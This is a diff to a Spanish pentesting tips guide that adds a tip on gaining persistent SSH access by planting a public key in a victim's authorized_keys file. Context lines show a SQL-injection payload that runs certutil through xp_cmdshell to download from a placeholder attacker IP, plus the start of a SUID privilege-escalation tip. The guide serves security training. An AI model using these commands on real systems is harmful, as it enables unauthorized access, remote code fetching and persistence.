@@ -798,7 +798,39 @@ inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
 ```
 Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/ , también es comun que los comandos no se ejecuten de forma de "stacked querys"
 ## Tip #22: Acceso a una maquina mediante autorized_keys
+Este concepto es algo complicado de comprender pero es muy poderoso si quieres obtener un acceso directo por SSH en lugar de una shell con las herramientas de Linux. Para que esto pueda suceder primero necesitas la capacidad de ejecucion de comandos sobre la maquina remota y que tenga el puerto 22 de SSH abierto.
 
+Una vez consigas los requisitos anteriores generaras tu par de llaves con el siguiente comando:
+```bash
+┌──(jorge㉿pentest)-[~]
+└─$ ssh-keygen
+Generating public/private ed25519 key pair.
+Enter file in which to save the key (/home/jorge/.ssh/id_ed25519): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /home/jorge/.ssh/id_ed25519
+Your public key has been saved in /home/jorge/.ssh/id_ed25519.pub
+The key fingerprint is:
+SHA256:2rJanaay11OTeFFMsRr6GNtj3CYXJKuFlUJ0tIuu2yy jorge@pentest
+The key's randomart image is:
++---[ED25519 256]----+
+| E.BO==o        |
+| +.*+=+. .      |
+| o o.B.+ o .    |
+| o o * * .      |
+| . . . S o +    |
+| . o o o o      |
+| = o o .        |
+| +.+ .          |
+| +*=            |
++----[SHA256]-----+
+```
+Ahora en la maquina remota copiaras la llave publica, en mi caso ```id_ed25519.pub```, en el direcotorio ```/home/<victima>/.ssh/authorized_keys```.
+
+Una vez realizado lo anterior puedes conectarte mediante SSH a la maquina remota con el siguiente comando:
+```bash
+ssh victima@ip-remota -i /home/jorge/.ssh/id_ed25519
+```
 ## Tip #23: Abuso de SUID para escalar privilegios
 SUID (Set User ID) es un tipo de permiso en Linux que permite a un archivo ejecutable ser ejecutado con los privilegios del propietario del archivo, en lugar de los del usuario que lo ejecuta. Esto es útil en casos donde se necesita que un programa realice tareas que requieren permisos elevados, como cambiar configuraciones del sistema o acceder a archivos restringidos, pero sin que el usuario tenga acceso directo a esos permisos. Por ejemplo, un programa con SUID establecido, aunque ejecutado por un usuario normal, se ejecutará con los privilegios del usuario root.
 
